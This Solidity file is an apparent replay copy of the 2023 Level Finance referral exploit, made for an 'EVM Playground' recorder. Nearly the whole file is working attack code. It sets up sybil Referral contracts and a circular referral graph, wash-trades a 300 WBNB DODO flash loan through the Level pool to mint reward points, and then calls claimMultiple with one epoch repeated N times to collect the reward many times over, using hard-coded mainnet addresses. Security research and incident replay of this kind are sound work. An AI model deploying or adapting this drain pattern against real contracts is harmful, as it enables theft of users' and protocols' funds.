// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-Level).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness — the DODO flash-loan callback `DPPFlashLoanCall` lives on the test
// itself (`assetTo = address(this)`), the circular referral setup, the 30 sybil
// `Referral` deployers, and the wash-trade loop are all on the test contract,
// so there is no single standalone exploit contract to deploy. This file is a
// faithful, self-contained copy of that inline attack (the testExploit body +
// DPPFlashLoanCall callback + the Exploiter/Referral helper contracts + minimal
// inline interfaces — no imports so it compiles anywhere), compiled inside the
// registry forge project. Logic and constants are copied verbatim from
// test/Level_exp.sol.
//
// The recorder runs this in phases to mirror the Foundry test's vm.warp/vm.prank
// sequencing (which @ethereumjs cannot do mid-call):
//   setup  (unrecorded, as attacker + a distributor prank):
//     fundAttackerWei, then prepare() (referral graph + DODO wash-trade),
//     then setEnableNextEpoch(true)+nextEpoch() (pranked as distributor),
//     then claimHonest().
//   attack (recorded): claimMultiple([13] x N) on the attacker's own account —
//     the vulnerable no-duplicate-check loop.
// Profit is the attacker EOA's LVL balance delta across both phases.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IPool {
    function swap(address _tokenIn, address _tokenOut, uint256 _minOut, address _to, bytes calldata extradata)
        external;
}

interface ILevelReferralControllerV2 {
    function claim(uint256 _epoch, address _to) external;
    function claimMultiple(uint256[] calldata _epoches, address _to) external;
    function setReferrer(address _referrer) external;
    function currentEpoch() external view returns (uint256);
    function claimable(uint256 _epoch, address _user) external view returns (uint256);
    function setEnableNextEpoch(bool _enable) external;
    function nextEpoch() external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract LevelReferralDrain {
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant LVL = IERC20(0xB64E280e9D1B5DbEc4AcceDb2257A87b400DB149);
    ILevelReferralControllerV2 constant LevelReferralControllerV2 =
        ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);
    IPool constant pool = IPool(0xA5aBFB56a78D2BD4689b25B8A77fd49Bb0675874);
    address constant dodo = 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d;

    Exploiter public exploiter;

    // Phase 1 — build the circular referral graph + 30 sybil referees, then run
    // the DODO-flash-loaned wash-trade loop that mints trading/referral points
    // for the current epoch (13). Mirrors testExploit() lines: deploy Exploiter,
    // setReferrer(exploiter), createReferral(), WashTrading().
    function prepare() external {
        exploiter = new Exploiter(address(this));
        LevelReferralControllerV2.setReferrer(address(exploiter));
        // 15 sybils point at the Exploiter, 15 at this contract (the attacker).
        for (uint256 i; i < 15; i++) {
            new Referral(address(exploiter));
        }
        for (uint256 i; i < 15; i++) {
            new Referral(address(this));
        }
        // DODO flash-loan 300 WBNB; the callback below runs the 20× wash-trade
        // loop through the Level Pool with the Exploiter as referee.
        IDVM(dodo).flashLoan(300 * 1e18, 0, address(this), abi.encode(uint256(20)));
    }

    // DODO DVM flash-loan callback (DPPFlashLoanCall). The pool optimistically
    // sent 300 WBNB; here we wash-trade it through the Level Pool to mint points,
    // then repay 300 WBNB. Copied verbatim from the test.
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        uint256 amount = abi.decode(data, (uint256));
        for (uint256 i; i < amount; i++) {
            WBNB.transfer(address(pool), WBNB.balanceOf(address(this)));
            pool.swap(address(WBNB), address(USDT), 1, address(this), abi.encode(address(exploiter)));
            USDT.transfer(address(pool), USDT.balanceOf(address(this)));
            pool.swap(address(USDT), address(WBNB), 1, address(this), abi.encode(address(exploiter)));
        }
        WBNB.transfer(address(exploiter), WBNB.balanceOf(address(this)));
        exploiter.swap(20);
        WBNB.transfer(dodo, 300 * 1e18);
    }

    // Phase 2 — two honest single-epoch claims (baseline value). Called after
    // nextEpoch() has finalized epoch 13. Mirrors the test's claim().
    function claimHonest() external {
        uint256 tokenID = LevelReferralControllerV2.currentEpoch() - 1;
        LevelReferralControllerV2.claim(tokenID, address(this));
        exploiter.claim(tokenID);
    }

    // Phase 3 (RECORDED) — the vulnerability. claimMultiple() pays out
    // claimable(13) once per array entry with NO duplicate-element check, so
    // passing [13]×N multiplies the per-epoch reward ~N×. This is the attack.
    function attack(uint256 amount) external {
        uint256 tokenID = LevelReferralControllerV2.currentEpoch() - 1;
        uint256[] memory epoches = new uint256[](amount);
        for (uint256 i; i < amount; i++) {
            epoches[i] = tokenID;
        }
        LevelReferralControllerV2.claimMultiple(epoches, address(this));
        exploiter.claimMultiple(amount);
    }
}

// Helper that holds its own WBNB and claims on behalf of msg.sender. Copied
// verbatim from the test (constructor sets the referrer to close the circular
// referral graph).
contract Exploiter {
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPool constant pool = IPool(0xA5aBFB56a78D2BD4689b25B8A77fd49Bb0675874);
    ILevelReferralControllerV2 constant LevelReferralControllerV2 =
        ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);

    constructor(address _referrer) {
        LevelReferralControllerV2.setReferrer(_referrer);
    }

    function swap(uint256 amount) external {
        for (uint256 i; i < amount; i++) {
            WBNB.transfer(address(pool), WBNB.balanceOf(address(this)));
            pool.swap(address(WBNB), address(USDT), 1, address(this), abi.encode(address(msg.sender)));
            USDT.transfer(address(pool), USDT.balanceOf(address(this)));
            pool.swap(address(USDT), address(WBNB), 1, address(this), abi.encode(address(msg.sender)));
        }
        WBNB.transfer(msg.sender, WBNB.balanceOf(address(this)));
    }

    function claim(uint256 tokenId) external {
        LevelReferralControllerV2.claim(tokenId, msg.sender);
    }

    function claimMultiple(uint256 amount) external {
        uint256 tokenID = LevelReferralControllerV2.currentEpoch() - 1;
        uint256[] memory epoches = new uint256[](amount);
        for (uint256 i; i < amount; i++) {
            epoches[i] = tokenID;
        }
        LevelReferralControllerV2.claimMultiple(epoches, msg.sender);
    }
}

contract Referral {
    ILevelReferralControllerV2 constant LevelReferralControllerV2 =
        ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);

    constructor(address _referrer) {
        LevelReferralControllerV2.setReferrer(_referrer);
    }
}
